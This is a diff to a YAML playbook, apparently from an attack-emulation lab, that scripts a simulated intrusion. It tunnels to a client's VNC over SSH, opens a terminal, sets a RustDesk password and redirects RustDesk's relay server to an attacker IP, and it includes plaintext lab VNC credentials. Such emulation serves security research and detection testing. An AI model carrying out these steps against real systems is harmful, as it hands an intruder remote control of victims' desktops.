@@ -8,7 +8,7 @@ vars:
   CLIENT_IP: 192.168.50.100
   MGMT_IP: 192.42.0.201
   MGMT_USERNAME: aecid
-  CLIENT_VNC_PORT: 5901
+  CLIENT_VNC_PORT: 5900
   CLIENT_VNC_USER: judy
   CLIENT_VNC_PASSWORD: garland
   ATTACKER_VNC_PORT: 5901
@@ -23,25 +23,43 @@ commands:
     creates_session: tunnel
     cmd: "ssh -i /home/aecid/.ssh/attacker  -o StrictHostKeyChecking=no -L 5902:$CLIENT_IP:$CLIENT_VNC_PORT $MGMT_USERNAME@$MGMT_IP \n"
 
-
-
   - type: vnc
     cmd: capture
     filename: initial_screenshot.png
     hostname: localhost
     port: 5902
-    password: garland
     creates_session: social_engineering
+
+# Opening a terminal from the menu
 
   - type: vnc
     cmd: move
-    x: 300
-    y: 300
+    x: 5
+    y: 5
     session: social_engineering
 
   - type: vnc
     cmd: click
     session: social_engineering
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: type
+    input: "terminal"
+    session: social_engineering
+    
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: social_engineering
+
+  - type: sleep
+    seconds: 3
 
   - type: vnc 
     cmd: type 
@@ -82,7 +100,7 @@ commands:
 
   - type: vnc
     cmd: type
-    input: "rustdesk --set-password password"
+    input: "rustdesk --password password"
     session: social_engineering
 
   - type: sleep
@@ -96,6 +114,7 @@ commands:
   - type: sleep
     seconds: 2
 
+# start rustdesk
   - type: vnc
     cmd: type
     input: "rustdesk"
@@ -111,6 +130,88 @@ commands:
 
   - type: sleep
     seconds: 2
+
+# option menu
+  - type: vnc
+    cmd: move
+    x: 167
+    y: 188
+    session: social_engineering
+
+  - type: sleep
+    seconds: 1
+
+  - type: vnc
+    cmd: click
+    session: social_engineering
+
+  - type: sleep
+    seconds: 1
+
+# network
+  - type: vnc
+    cmd: move
+    x: 82
+    y: 272
+    session: social_engineering
+
+  - type: vnc
+    cmd: click
+    session: social_engineering
+
+  - type: sleep
+    seconds: 1
+
+# unlock network settings, no password?
+  - type: vnc
+    cmd: move
+    x: 468
+    y: 131
+    session: social_engineering
+
+  - type: vnc
+    cmd: click
+    session: social_engineering
+
+  - type: sleep
+    seconds: 1
+
+# id relay server
+  - type: vnc
+    cmd: move
+    x: 268
+    y: 182
+    session: social_engineering
+
+  - type: vnc
+    cmd: click
+    session: social_engineering
+
+  - type: sleep
+    seconds: 1
+
+# Enter id server IP
+  - type: vnc
+    cmd: type
+    input: $ATTACKMATE_IP
+    session: social_engineering
+
+  - type: sleep
+    seconds: 1
+
+# click ok
+  - type: vnc
+    cmd: move
+    x: 621
+    y: 490
+    session: social_engineering
+
+  - type: vnc
+    cmd: click
+    session: social_engineering
+
+  - type: sleep
+    seconds: 1
 
 
   
